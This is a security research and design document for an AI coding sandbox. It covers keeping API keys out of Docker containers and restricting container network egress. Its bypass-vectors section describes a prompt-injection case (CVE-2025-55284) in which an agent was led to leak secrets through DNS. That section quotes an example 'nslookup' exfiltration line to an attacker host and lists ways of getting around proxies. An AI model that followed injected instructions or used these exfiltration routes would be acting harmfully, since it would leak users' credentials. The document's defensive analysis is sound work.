# Security Research

## Credential Management for Docker Containers

Research into secure approaches for passing API keys (primarily `ANTHROPIC_API_KEY`) into Docker containers. The current design passes keys as environment variables via `docker run -e`. This section evaluates the risks, alternatives, and what competitors actually do.

### 1. Risks of the Environment Variable Approach

Environment variables passed via `docker run -e` are exposed through multiple verified attack vectors:

**Verified exposure points:**

1. **`docker inspect`** — Any user with access to the Docker socket can run `docker inspect <container>` and see all environment variables in the `Config.Env` field, in plaintext. This is the most commonly cited risk. ([Docker official secrets docs](https://docs.docker.com/engine/swarm/secrets/), [Baeldung](https://www.baeldung.com/ops/docker-get-environment-variable))

2. **`/proc/<pid>/environ`** — Inside the container, the environment of PID 1 is readable at `/proc/1/environ` by any process running as the same user (or root). If a dependency has a code injection vulnerability, the attacker can read env vars directly from procfs. In unprivileged containers without `CAP_SYS_PTRACE`, access to other users' `/proc/<pid>/environ` is restricted, but same-user access is still available. ([moby/moby#6607](https://github.com/moby/moby/issues/6607))

3. **`docker logs --details`** — Some logging drivers add env vars to log output. The `--details` flag adds extra attributes including environment variables provided at container creation. ([Docker logs docs](https://docs.docker.com/reference/cli/docker/container/logs/))

4. **`docker commit`** — If someone runs `docker commit` on a running container, environment variables set via `docker run -e` are preserved in the committed image's metadata. Docker secrets explicitly protect against this. ([Docker secrets docs](https://docs.docker.com/engine/swarm/secrets/))

5. **Legacy `--link`** — The deprecated `--link` flag exposed all environment variables from the source container to the linked container. Starting with Docker v29.0, these variables are no longer set by default. Full removal planned for v30.0. ([Docker deprecated features](https://docs.docker.com/engine/deprecated/), [moby/moby#5169](https://github.com/moby/moby/issues/5169))

6. **Application logging** — Any application code that logs its environment (common in debugging) will include secrets. The CNCF recommends secrets be "immune to leaks via logs, audit, or system dumps." ([CyberArk](https://developer.cyberark.com/blog/environment-variables-dont-keep-secrets-best-practices-for-plugging-application-credential-leaks/))

7. **Image layers** — Secrets set via `ENV` in Dockerfiles persist in image layers and are recoverable via `docker history` or exported tarballs. This applies to build-time, not runtime `-e` flags, but is a common confusion point. ([Xygeni](https://xygeni.io/blog/dockerfile-secrets-why-layers-keep-your-sensitive-data-forever/))

**Risk assessment for yoloAI's threat model:**

- **docker inspect** — REAL risk. Anyone with Docker socket access (which yoloAI users inherently have) can see the key. Mitigated by the fact that the user is the one who provided the key in the first place — this is a self-exposure vector, not an escalation. The risk increases if a malicious process on the host enumerates Docker containers.
- **/proc/1/environ** — REAL risk inside the container. If Claude Code or any tool it installs has a vulnerability, the API key is trivially accessible. However, the AI agent already has the key to make API calls — the concern is more about exfiltration by a *different* compromised process in the same container.
- **docker logs** — LOW risk. Depends on logging driver configuration. Default json-file driver does not include env vars in log output unless `--details` is used.
- **docker commit** — LOW risk. Users are unlikely to commit running sandbox containers, but worth documenting.
- **--link** — NOT APPLICABLE. yoloAI doesn't link containers.

### 2. Docker Swarm Secrets

**How they work:**

Docker secrets are a Swarm-mode feature. The secret lifecycle:
1. Admin creates a secret via `docker secret create`, which sends it to a Swarm manager over mutual TLS.
2. The manager stores it encrypted in the Raft log, replicated across managers.
3. When a service with access to the secret starts a task, the decrypted secret is mounted into the container at `/run/secrets/<name>` on an in-memory filesystem (tmpfs on Linux).
4. The secret is never exposed as an environment variable. It cannot be captured by `docker inspect`, `docker commit`, or process listing.

**Can they work without Swarm?**

No. The [Docker documentation](https://docs.docker.com/engine/swarm/secrets/) explicitly states: "Docker secrets are only available to swarm services, not to standalone containers." The [moby/moby#33519](https://github.com/moby/moby/issues/33519) issue (filed 2017, closed as "completed") confirmed this is by design — the Swarm Raft log infrastructure is the backing store.

**Docker Compose workaround:**

Docker Compose provides a secrets mechanism that works without Swarm, but it is mechanically different. Compose mounts the secret file from the host filesystem as a bind mount into `/run/secrets/<name>` inside the container. This is NOT the same as Swarm secrets — there is no encryption at rest, no Raft log, no mutual TLS. It is a convenience feature that provides the same file-path API (`/run/secrets/`) so applications work identically in dev (Compose) and prod (Swarm). ([Docker Compose secrets docs](https://docs.docker.com/compose/how-tos/use-secrets/))

However, Compose secrets require Docker Compose. They cannot be used with plain `docker run`.

**Relevance to yoloAI:**

Not directly usable. yoloAI uses `docker run`, not Swarm services or Docker Compose. We would need to implement the same pattern ourselves (mount a file at `/run/secrets/`), which is the file-based injection approach covered in section 3.

**Platform notes:**
- Linux: secrets backed by tmpfs (in-memory, never hits disk).
- Windows: secrets persisted in cleartext to the container's root disk due to lack of a RAM disk driver. Explicitly removed when container stops. ([Docker secrets docs](https://docs.docker.com/engine/swarm/secrets/))
- Maximum secret size: 500 KB.

### 3. File-Based Credential Injection

**Pattern:** Write the API key to a file on the host, bind-mount it into the container (read-only), have the entrypoint read it, optionally export to an env var, then (optionally) delete/unmount.

**How it works mechanically:**

```bash
# Host side: write key to temp file
echo "$ANTHROPIC_API_KEY" > /tmp/yoloai-secret-$$
chmod 600 /tmp/yoloai-secret-$$

# Run container with bind mount
docker run --rm \
  -v /tmp/yoloai-secret-$$:/run/secrets/anthropic_api_key:ro \
  yoloai-sandbox

# Host side: clean up
rm /tmp/yoloai-secret-$$
```

Inside the container entrypoint:
```bash
export ANTHROPIC_API_KEY=$(cat /run/secrets/anthropic_api_key)
# Optionally: rm /run/secrets/anthropic_api_key (if not read-only mount)
exec "$@"
```

**What it protects against:**
- `docker inspect` — the key does NOT appear in `Config.Env` (it was never passed as `-e`).
- `docker commit` — the bind mount is not part of the container's writable layer.
- Image layers — nothing baked in.
- `docker logs` — no env var to leak to log drivers.

**What it does NOT protect against:**
- `/proc/1/environ` — once exported to an env var in the entrypoint, it is still in the process environment. The window is reduced (from container creation to entrypoint exec), but not eliminated.
- File on host disk — the temp file exists briefly on the host filesystem. Could be captured if the host is compromised during that window. Mitigatable with tmpfs (see section 5).
- Processes inside the container can still read the env var after export.

**Who uses this pattern:**
- Docker official images (MySQL, Postgres) support `*_FILE` env vars that read credentials from files. E.g., `MYSQL_ROOT_PASSWORD_FILE=/run/secrets/db_password`. ([Docker mysql image docs](https://github.com/docker-library/mysql/issues/88))
- Docker Compose secrets use this exact mechanism (bind mount to `/run/secrets/`).
- deva.sh mounts credential files read-only into containers.
- cco mounts extracted Keychain credentials as read-only temporary files.

**Cross-platform:** Works on Linux, macOS (Docker Desktop), Windows/WSL. No platform-specific concerns beyond the temp file location.

**Complexity:** Low. Requires a few lines in the entrypoint and cleanup logic on the host side.

**Production use:** Widely used. The `*_FILE` pattern is the Docker-recommended approach for official images.

### 4. Credential Proxy Approach (Docker Sandbox)

**How Docker Sandbox does it:**

Docker Sandbox (GA in Docker Desktop 4.50+) uses an HTTP/HTTPS filtering proxy that runs on the host at `host.docker.internal:3128`. The proxy performs two functions: network policy enforcement and credential injection. ([Docker Sandbox architecture](https://docs.docker.com/ai/sandboxes/architecture/))

**Mechanical details:**
1. The sandbox VM is configured to route all outbound HTTP/HTTPS traffic through the proxy.
2. The proxy acts as a MITM: it terminates TLS and re-encrypts with its own CA certificate. The sandbox trusts this CA.
3. When the proxy sees an outbound request to a known provider API (Anthropic, OpenAI, Google, GitHub), it injects the appropriate authentication header using credentials from the host's environment variables.
4. The agent inside the sandbox makes API calls without credentials — the proxy adds them transparently.
5. Credentials never enter the sandbox VM at all. They exist only on the host and in the proxy process.

**Bypass mode:** For applications that use certificate pinning or other techniques incompatible with MITM proxying, bypass mode tunnels traffic directly without inspection. Bypassed traffic loses credential injection and policy enforcement. ([Docker Sandbox network policies](https://docs.docker.com/ai/sandboxes/network-policies/))

**What it protects against:**
- ALL container-side exposure vectors: `docker inspect`, `/proc/environ`, `docker commit`, `docker logs`, application logging, compromised dependencies — the credential is never in the container at all.
- This is the strongest protection model of any approach researched.

**What it does NOT protect against:**
- Host compromise (credentials exist in host env vars and the proxy process).
- A compromised agent could theoretically make arbitrary API calls through the proxy (the proxy adds auth to any request matching the provider domain).
- Certificate-pinning applications won't work (must use bypass mode, losing protection).
- The proxy itself is an attack surface (MITM position).

**Cross-platform:**
- macOS: Full support via Docker Desktop's `virtualization.framework`.
- Windows: Via Hyper-V.
- Linux: Degraded — no microVM, container-based sandbox only.

**Complexity:** HIGH. Implementing a credential-injecting MITM proxy is a major undertaking. Docker builds this into Docker Desktop infrastructure. For yoloAI to replicate this, we would need:
- An HTTP/HTTPS proxy process running on the host (e.g., mitmproxy or a custom Go proxy).
- CA certificate generation and injection into the container's trust store.
- Provider-specific request matching and header injection logic.
- Proxy lifecycle management (start/stop with sandbox).
- Bypass configuration for incompatible applications.

**Production use:** Docker Sandbox is the only tool using this approach. It is production-quality but proprietary to Docker Desktop.

**Assessment for yoloAI:** The credential proxy is the gold standard for credential isolation, but the implementation cost is prohibitive for v1. Worth considering for a future version or as an optional advanced mode. The simpler file-based injection gets us 80% of the benefit at 10% of the cost.

### 5. tmpfs-Mounted Secrets

**How it works:**

Instead of bind-mounting a host file, create a tmpfs mount inside the container at a known path and write the secret there. The data exists only in RAM — never hits disk, on host or in container.

```bash
docker run --rm \
  --tmpfs /run/secrets:size=1m,mode=0700,uid=1000 \
  -e _INIT_SECRET_anthropic_api_key="$ANTHROPIC_API_KEY" \
  yoloai-sandbox
```

The entrypoint writes the env var to a file in the tmpfs, then unsets the env var:
```bash
echo "$_INIT_SECRET_anthropic_api_key" > /run/secrets/anthropic_api_key
unset _INIT_SECRET_anthropic_api_key
exec "$@"
```

**What it protects against:**
- Disk persistence — the secret never touches a filesystem backed by storage. On container stop, tmpfs contents vanish.
- `docker commit` — tmpfs mounts are not part of the container's writable layer.
- Image layers — nothing baked in.

**What it does NOT protect against:**
- The initial transport still uses an env var (`_INIT_SECRET_*`), which is visible in `docker inspect` and `/proc/1/environ` until the entrypoint unsets it. This is a window of vulnerability.
- Root inside the container can read `/run/secrets/` after the file is written.
- Swap — tmpfs data CAN be swapped to disk if the host is under memory pressure. This is a known caveat for security-critical deployments. ([Docker tmpfs docs](https://docs.docker.com/engine/storage/tmpfs/))

**Cross-platform:** Works on all platforms. tmpfs is a kernel feature available in Docker's Linux VM on macOS/Windows.

**Complexity:** Low. The `--tmpfs` flag is a standard Docker feature.

**Comparison to file-based mount:**
- tmpfs avoids leaving a temp file on the host disk (the bind-mount approach writes to host filesystem briefly).
- But the initial env var transport is actually *worse* than a file mount (file mount never puts the secret in an env var at all).
- Can be combined with file-based mount for best of both: create tmpfs inside container, then populate it via a bind-mounted file read in entrypoint.

**Production use:** Docker's own Swarm secrets use tmpfs-backed mounts at `/run/secrets/`. The pattern is well-established.

### 6. What Competitors Actually Do

#### deva.sh (thevibeworks/claude-code-yolo)

**Approach:** Multi-method credential handling.
- Supports `ANTHROPIC_API_KEY` as an env var passed via `docker run -e`.
- Also supports mounting credential *files* as read-only Docker volumes (e.g., `.claude/`, `.aws/`, `.config/gcloud/`, `.codex/auth.json`).
- Credentials mounted as `:ro` volumes cannot be modified by the container.
- Auth stripping: when `.codex/auth.json` is mounted, conflicting `OPENAI_*` env vars are stripped to prevent credential shadowing.
- Config priority chain: XDG config dirs → home dotfile → project-level → local override.

**Assessment:** Pragmatic approach. Uses env vars for API keys (simple) but mounts credential files read-only for OAuth and cloud provider auth. No tmpfs or proxy sophistication. ([thevibeworks/claude-code-yolo](https://github.com/thevibeworks/claude-code-yolo))

#### Docker Sandbox

**Approach:** Credential proxy (see section 4). Credentials never enter the sandbox VM. The MITM proxy on the host injects auth headers into API requests transparently. The strongest credential isolation of any tool surveyed. However, users report OAuth authentication broken for Pro/Max plans ([docker/for-mac#7842](https://github.com/docker/for-mac/issues/7842)) and credentials lost on sandbox removal ([docker/for-mac#7827](https://github.com/docker/for-mac/issues/7827)).

#### cco (nikvdp/cco)

**Approach:** Platform-specific credential extraction + runtime mounting.
- On macOS: automatically extracts Claude Code credentials from macOS Keychain using `security find-generic-password`.
- On Linux: reads credentials from config files.
- Credentials are written to a temporary location, mounted read-only into the container at runtime, and cleaned up after the session.
- Credentials are never baked into Docker images.
- Cross-platform: macOS Keychain, Linux files, env vars — auto-detected.

**Assessment:** Smart Keychain integration for macOS. The "extract from OS credential store → temp file → mount → cleanup" pattern is a reasonable middle ground. ([nikvdp/cco](https://github.com/nikvdp/cco))

#### Anthropic sandbox-runtime

**Approach:** Environment inheritance with filesystem restrictions.
- The sandboxed process inherits its parent's environment (including `ANTHROPIC_API_KEY`).
- Security comes from filesystem restrictions (deny read access to `~/.ssh`, `~/.aws`, etc.) and network restrictions (domain allowlisting), not from credential isolation.
- No explicit credential filtering or sanitization.
- The tool focuses on preventing the agent from accessing *other* credentials on the system, not on protecting the API key that the agent needs.

**Assessment:** Does not attempt to solve credential isolation. The API key is in the environment, same as a plain `docker run -e`. Security posture relies on the sandbox preventing *lateral* credential access (SSH keys, cloud creds). ([anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime))

#### Trail of Bits devcontainer

**Approach:** Filesystem isolation with controlled mounts.
- The container has no access to host filesystem, SSH keys, or cloud credentials by default.
- Host `~/.gitconfig` is mounted read-only for git identity.
- Additional credential files can be mounted on demand via `devc mount ~/secrets /secrets --readonly`.
- No automated credential extraction or proxy.

**Assessment:** Conservative security-first approach. Credentials require explicit opt-in mounting. No special credential handling — relies on standard Docker volume mounts. ([trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer))

#### claude-code-sandbox (TextCortex, archived)

**Approach:** Credential management was the #1 reported pain point.
- Issues #17 and #14 both related to credentials not reaching the container.
- Auto-extracted macOS Keychain credentials.
- Was archived before the credential issues were resolved.

**Assessment:** Cautionary tale. Credential handling in containers is genuinely hard — this project died partly because they couldn't get it right cross-platform.

### 7. BuildKit Secrets

**How they work:**

The `RUN --mount=type=secret` Dockerfile instruction makes a secret available during a single `RUN` instruction without writing it to any image layer. ([Docker BuildKit secrets docs](https://docs.docker.com/build/building/secrets/))

```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=mytoken \
    TOKEN=$(cat /run/secrets/mytoken) && \
    curl -H "Authorization: Bearer $TOKEN" https://api.example.com/setup
```

Build invocation:
```bash
docker build --secret id=mytoken,src=./token.txt .
```

**Key properties:**
- Secret is available only during the RUN instruction that mounts it.
- It is mounted at `/run/secrets/<id>` by default (customizable via `target=`).
- NOT persisted in any image layer — `docker history` shows nothing.
- Source can be a file or environment variable (`type=file` or `type=env`).
- Maximum size: 500 KB.

**Relevance to yoloAI:**

BuildKit secrets are for *build time*, not *run time*. They are relevant when building profile base images that need to pull from private registries or install licensed tools. They are NOT relevant for passing `ANTHROPIC_API_KEY` to running containers.

yoloAI's profile system (`~/.yoloai/profiles/<name>/Dockerfile`) supports BuildKit secrets for handling private dependencies during `docker build`, protecting credentials from leaking into built images (see [commands.md](../design/commands.md) `yoloai build` section).

**Cross-platform:** Works everywhere BuildKit works (Docker 18.09+, enabled by default in Docker Desktop and recent Docker Engine).

### 8. Best Practices from Standards Bodies

#### OWASP Docker Security Cheat Sheet

**RULE #12 — Utilize Docker Secrets for Sensitive Data Management:**
Recommends Docker Secrets as the primary mechanism. Secrets are stored separately from container configurations, reducing accidental exposure. For non-Swarm environments, the guidance is to use equivalent file-mounting patterns. ([OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html))

**OWASP Secrets Management Cheat Sheet:**
Recommends regular secret rotation so stolen credentials have limited lifetime. Recommends secrets be injected at runtime, never stored in images or code. ([OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html))

#### CIS Docker Benchmark

- Using `ENV` in Dockerfiles to store secrets exposes them in image layers; extractable via `docker save` or tools like Dive/TruffleHog. ([CIS Docker Benchmark summary](https://www.aquasec.com/cloud-native-academy/docker-container/docker-cis-benchmark/))
- Secrets should be injected at runtime, not hardcoded in images.
- File-mounting secrets is preferred over environment variables.
- Applications commonly log their environment, which will include env var secrets.

#### CNCF Guidance

The Cloud Native Computing Foundation recommends that "secrets should be injected at runtime within the workloads through non-persistent mechanisms that are immune to leaks via logs, audit, or system dumps (i.e., in-memory shared volumes instead of environment variables)."

### Summary and Design Approach

**Approach comparison:**

| Approach | docker inspect | /proc/environ | docker commit | Disk persistence | Complexity | Cross-platform |
|----------|---------------|---------------|---------------|-----------------|------------|----------------|
| Env var (`-e`) | EXPOSED | EXPOSED | EXPOSED | No | Trivial | All |
| File bind mount (`:ro`) | Hidden | Hidden (until entrypoint exports) | Hidden | Brief (host temp file) | Low | All |
| tmpfs + env var init | EXPOSED (briefly) | EXPOSED (until unset) | Hidden | No (RAM only) | Low | All |
| File on tmpfs (combined) | Hidden | Hidden (until export) | Hidden | No | Low-Medium | All |
| Credential proxy | Hidden | N/A (never in container) | N/A | No | Very High | Partial |
| Docker Swarm secrets | Hidden | Hidden | Hidden | No (tmpfs) | N/A (requires Swarm) | All |

**Approach adopted for yoloAI v1:**

**File-based injection via bind mount to tmpfs**, combining sections 3 and 5:

1. yoloAI creates a tmpfs directory on the host (Linux: native tmpfs; macOS/Windows: a temp file with immediate cleanup after container start).
2. API key is written to a file in this directory.
3. The file is bind-mounted read-only into the container at `/run/secrets/anthropic_api_key`.
4. The container entrypoint reads the file, exports to env var (since Claude Code and other agents expect `ANTHROPIC_API_KEY` in the environment), then the agent runs.
5. The host-side temp file is cleaned up immediately after container start.

**Tradeoffs accepted:**
- The agent process will have the API key in its environment (unavoidable — agents expect env vars). This means `/proc/<pid>/environ` exposes it to same-user processes inside the container.
- This is acceptable because the AI agent already has full use of the key (it makes API calls). The threat we're mitigating is accidental or unnecessary exposure, not preventing the agent from having the key.

**What this protects:**
- `docker inspect` does NOT show the key.
- `docker commit` does NOT capture the key.
- `docker logs` does NOT leak the key.
- No temp file lingers on host disk (tmpfs or immediate cleanup).
- Image layers never contain the key.

**Future considerations:**
- Credential proxy (Docker Sandbox approach) could be added as an advanced option in a later version.
- If agents add support for reading API keys from files (e.g., `ANTHROPIC_API_KEY_FILE`), we can skip the env var export entirely and get even stronger isolation.
- macOS Keychain integration (cco's approach) could be added as a credential source option.
- BuildKit secrets are supported for profile Dockerfile builds that need private dependencies (see [commands.md](../design/commands.md) `yoloai build` section).

---

## Network Isolation Research

Research into Docker network isolation mechanisms for an AI coding sandbox tool, focusing on verified approaches used in production.

### 1. Docker Network Isolation Mechanisms

#### `--network none`

The `none` network driver completely removes all network interfaces from a container except the loopback device (`lo`). No DNS resolution, no external access, no container-to-container communication. This is the most restrictive option.

**Source:** [Docker Docs — None network driver](https://docs.docker.com/engine/network/drivers/none/)

**Implications for yoloAI:** Useful for `--network-none` mode (offline tasks). Unusable when Claude needs API access because there is no mechanism to selectively permit traffic — it is all-or-nothing.

#### `--internal` flag on custom networks

`docker network create --internal <name>` creates a bridge network where containers can communicate with each other but have no route to external networks. Docker sets up firewall rules to drop all traffic to/from other networks and does not configure a default route.

**Source:** [Docker Docs — docker network create](https://docs.docker.com/reference/cli/docker/network/create/), [Docker Docs — Networking](https://docs.docker.com/engine/network/)

**Implications for yoloAI:** This is the foundation for the proxy-gateway pattern. Put the sandbox container on an `--internal` network, and place a proxy container on both the internal network and a normal (internet-connected) network. The sandbox can only reach the proxy; the proxy decides what reaches the internet.

#### Host-level firewall rules (DOCKER-USER chain)

Docker creates iptables/nftables rules in the **host's** network namespace for bridge networks. The `DOCKER-USER` chain (iptables) or separate nftables tables allow injecting custom rules that run before Docker's own rules. This enables per-container egress filtering from the host.

**Source:** [Docker Docs — Packet filtering and firewalls](https://docs.docker.com/engine/network/packet-filtering-firewalls/), [Docker Docs — Docker with iptables](https://docs.docker.com/engine/network/firewall-iptables/)

#### Container-internal firewall rules (CAP_NET_ADMIN)

Containers can run `iptables` internally if granted `CAP_NET_ADMIN` (and sometimes `CAP_NET_RAW`). This is how the Claude Code devcontainer and Trail of Bits devcontainer implement their firewalls — iptables rules inside the container enforce a default-deny egress policy.

**Source:** [Docker Community Forums — Container with --cap-add=NET_ADMIN](https://forums.docker.com/t/container-with-cap-add-net-admin/111427)

### 2. Proxy-Based Domain Allowlisting in Docker

#### Approach: Internal network + proxy gateway

The established pattern:
1. Create an `--internal` Docker network (no internet access).
2. Run a proxy container connected to both the internal network and a normal network.
3. The sandbox container connects only to the internal network.
4. The sandbox's `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` environment variables point to the proxy.
5. The proxy enforces domain allowlisting.

**Source:** [The Sharat's — Running Docker containers in network isolation with proxied traffic](https://sharats.me/posts/docker-with-proxy/), [SequentialRead — Creating a Simple but Effective Outbound Firewall using Vanilla Docker-Compose](https://sequentialread.com/creating-a-simple-but-effective-firewall-using-vanilla-docker-compose/)

**Critical limitation:** `HTTP_PROXY`/`HTTPS_PROXY` environment variables are advisory. Not all applications honor them. Any process that opens a raw TCP socket bypasses the proxy entirely. This is a fundamental weakness of proxy-only approaches.

#### Squid proxy with domain allowlists

Squid can be configured as a forward proxy with domain-based ACLs. Several Docker images exist for this purpose:
- [jpetazzo/squid-in-a-can](https://github.com/jpetazzo/squid-in-a-can) — transparent Squid proxy using iptables redirection.
- [ionelmc/docker-transparent-squid](https://github.com/ionelmc/docker-transparent-squid) — transparent proxy with `CACHE_DOMAINS` env var.
- [jlandowner/docker-squid-allowlist](https://github.com/jlandowner/docker-squid-allowlist) — Kubernetes-focused allowlist proxy.

**For transparent proxying** (where the proxy intercepts traffic without client configuration), iptables `REDIRECT` rules are required to send all outbound HTTP/HTTPS to the proxy port. This requires `CAP_NET_ADMIN` or host-level rule injection.

#### Anthropic's sandbox-runtime

**Repo:** [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)

Architecture:
- Dual proxy: an HTTP proxy and a SOCKS5 proxy, both running **outside** the sandbox (on the host).
- **Linux:** The sandboxed process's network namespace is removed entirely. All traffic must go through the proxies via Unix domain sockets bind-mounted into the sandbox.
- **macOS:** A Seatbelt profile restricts network access to a specific localhost port where the proxies listen.
- Domain filtering: explicit allowlist model. By default, all network access is denied. Denied domains take precedence over allowed domains.
- DNS: resolved by the proxy on the host side (the sandbox has no direct DNS access on Linux because the network namespace is removed).

**Key design insight:** By removing the network namespace entirely (Linux) rather than using environment variables, sandbox-runtime makes proxy bypass impossible at the network layer. The process literally cannot create sockets that reach the outside world except through the proxy's Unix domain socket.

**Limitation:** Windows is not supported. The approach is not Docker-based — it uses OS-level sandboxing (Linux namespaces, macOS Seatbelt).

**Source:** [GitHub — sandbox-runtime README](https://github.com/anthropic-experimental/sandbox-runtime/blob/main/README.md), [Anthropic Engineering — Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)

#### Docker Sandboxes (Docker Inc.)

Docker's official sandbox product (sandboxes GA in Docker Desktop 4.50+; network policy features in 4.58+, Docker Engine 29.1.5+):
- Each sandbox runs in its own **microVM** with its own Docker daemon.
- A filtering proxy at `host.docker.internal:3128` handles all HTTP/HTTPS traffic.
- Raw TCP and UDP connections to external services are **blocked** (not just unproxied — actually blocked).
- Policy modes: `allow` (default, permit all except blocked CIDRs) or `deny` (block all except explicitly allowed hosts).
- Default blocks: private networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16) and IPv6 equivalents.
- DNS resolution happens at the proxy level. The proxy resolves domains and validates resolved IPs against CIDR rules.
- Configuration via `docker sandbox network proxy` CLI command with `--block-host`, `--allow-host`, `--block-cidr`, `--allow-cidr`, `--bypass-host`, `--policy`.

**Source:** [Docker Docs — Network policies](https://docs.docker.com/ai/sandboxes/network-policies/), [Docker Docs — docker sandbox network proxy](https://docs.docker.com/reference/cli/docker/sandbox/network/proxy/)

**Key design insight:** The microVM boundary is what makes raw TCP/UDP blocking possible — the VM's network stack can enforce rules that a container alone cannot. This is stronger than a container-only approach but requires Docker Desktop (not available on headless Linux servers).

#### Claude Code devcontainer (Anthropic's own)

**Source:** [GitHub — anthropics/claude-code .devcontainer/init-firewall.sh](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)

Uses iptables + ipset inside the container (requires `CAP_NET_ADMIN`):
1. Preserves Docker's internal DNS rules (127.0.0.11 NAT rules) before flushing.
2. Creates an `allowed-domains` ipset (`hash:net` type) for efficient IP matching.
3. Allowlists DNS (UDP 53), SSH (TCP 22), localhost, and the host network.
4. Fetches GitHub IP ranges dynamically from `https://api.github.com/meta`.
5. Resolves individual domains via `dig` and adds IPs to the ipset.
6. Sets default policy to `DROP` for INPUT, FORWARD, and OUTPUT.
7. Allows established/related connections.
8. Allows outbound only to IPs in the `allowed-domains` ipset.
9. Explicitly `REJECT`s (not drops) unmatched outbound for immediate feedback.
10. Verifies by confirming `example.com` is unreachable and `api.github.com` is reachable.

Allowlisted domains: `registry.npmjs.org`, `api.anthropic.com`, `sentry.io`, `statsig.anthropic.com`, `statsig.com`, `marketplace.visualstudio.com`, `vscode.blob.core.windows.net`, `update.code.visualstudio.com`, plus GitHub CIDRs.

**Weakness:** DNS (UDP 53) is allowed outbound to any destination. This is the DNS exfiltration vector. Also, domain-to-IP resolution is done at firewall setup time — if IPs change (CDN rotation), the firewall becomes stale.

#### Trail of Bits devcontainer

**Repo:** [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)

Similar approach to Anthropic's devcontainer: iptables + ipset with `CAP_NET_ADMIN`. Default-deny egress with domain allowlist. Each domain resolved via `dig +noall +answer A` and IPs added to an ipset. Requires `CAP_NET_ADMIN` and `CAP_NET_RAW` granted via Docker's `--cap-add`.

**Source:** [GitHub — trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer), [DeepWiki — Network Security & Firewall](https://deepwiki.com/anthropics/claude-code/6.2-network-security-and-firewall)

### 3. Known Bypass Vectors

#### DNS-based exfiltration (VERIFIED — CVE-2025-55284)

**CVE-2025-55284** demonstrated DNS exfiltration from Claude Code. The attack:
1. Malicious instructions embedded in files Claude analyzes (indirect prompt injection).
2. Claude reads sensitive data (e.g., `.env` files with API keys).
3. Claude executes allowlisted commands (`ping`, `nslookup`, `dig`, `host`) to encode the data as DNS subdomain queries (e.g., `nslookup APIKEY123.attacker.com`).
4. The attacker's DNS server receives the encoded data.

Fixed in Claude Code v1.0.4 (June 2025) by removing networking utilities from the auto-approve allowlist.

**Why this matters for network isolation:** Even with proxy-based domain allowlisting, DNS queries typically bypass the proxy. If the container can reach any DNS server (UDP 53), it can exfiltrate data. The Anthropic devcontainer's `init-firewall.sh` explicitly allows outbound UDP 53 — it is vulnerable to this vector. Anthropic's sandbox-runtime avoids this because the sandboxed process has no network namespace at all; DNS is resolved by the proxy on the host.

**Source:** [Embrace The Red — Claude Code: Data Exfiltration with DNS](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/), [CVE Details — CVE-2025-55284](https://www.cvedetails.com/cve/CVE-2025-55284/)

#### Raw TCP connections bypassing HTTP proxies

`HTTP_PROXY`/`HTTPS_PROXY` environment variables are **advisory only**. Any process can open a raw TCP socket and connect directly, ignoring the proxy. This applies to:
- Custom binaries downloaded during the session.
- Language runtimes that don't respect proxy env vars (some Java, Go, Rust programs).
- Tools like `curl --noproxy '*'` or `wget --no-proxy`.
- SSH, git-over-SSH, and other non-HTTP protocols.

**Mitigation:** Environment variables alone are insufficient. Either:
- Remove the network namespace entirely (sandbox-runtime approach), or
- Use iptables/nftables to block all outbound except to the proxy (iptables approach), or
- Use an `--internal` Docker network where the only reachable host is the proxy container (network topology approach).

#### Domain fronting

An attacker uses a legitimate CDN domain (e.g., `cloudfront.net`) in the TLS SNI field but sets a different `Host:` header to route to an attacker-controlled origin behind the same CDN. This bypasses domain-based allowlists that inspect only the SNI or DNS name.

**Practical risk for yoloAI:** Low-to-moderate. Domain fronting requires that both the allowed domain and the attacker's domain are served from the same CDN. Major CDN providers (AWS CloudFront, Google, Cloudflare) have banned domain fronting. However, it remains possible on some smaller CDNs. A proxy performing TLS inspection (MITM) can detect SNI/Host mismatches, but MITM adds complexity and breaks certificate pinning.

**Source:** [MITRE ATT&CK — T1090.004](https://attack.mitre.org/techniques/T1090/004/), [Wikipedia — Domain fronting](https://en.wikipedia.org/wiki/Domain_fronting), [Compass Security — Bypassing Web Filters Part 3](https://blog.compass-security.com/2025/03/bypassing-web-filters-part-3-domain-fronting/)

#### IP-direct connections

If the allowlist is domain-based, an attacker who knows an IP address can connect directly without a DNS lookup. This bypasses domain-based filtering unless the proxy also validates destination IPs.

**Mitigation:** Docker Sandboxes handles this by resolving domains to IPs at the proxy level and validating resolved IPs against CIDR rules. The iptables/ipset approach (used by Anthropic's devcontainer) inherently works on IPs, so domain-to-IP resolution happens at setup time.

#### Summary: proxy-only vs. iptables vs. network namespace removal

| Vector | Proxy-only (env vars) | iptables/ipset | Network namespace removal |
|---|---|---|---|
| HTTP/HTTPS to unapproved domains | Blocked | Blocked | Blocked |
| Raw TCP bypass | **NOT blocked** | Blocked | Blocked |
| DNS exfiltration (UDP 53) | **NOT blocked** | **NOT blocked** (if DNS allowed) | Blocked (if proxy resolves DNS) |
| Domain fronting | Not blocked without MITM | Not blocked | Not blocked without MITM |
| IP-direct connections | **NOT blocked** | Blocked (only allowlisted IPs) | Blocked |
| Non-HTTP protocols (SSH, etc.) | **NOT blocked** | Blocked (unless explicitly allowed) | Blocked |

### 4. iptables/nftables Approach

#### Can host iptables rules control container traffic?

Yes. Docker creates iptables rules in the **host's** network namespace for bridge networks. The `DOCKER-USER` chain in the `FORWARD` chain runs before Docker's own rules, allowing custom egress filtering. For nftables (Docker 29+, experimental), separate tables with matching base chains serve the same purpose.

DNS-specific iptables rules are additionally created inside the container's network namespace.

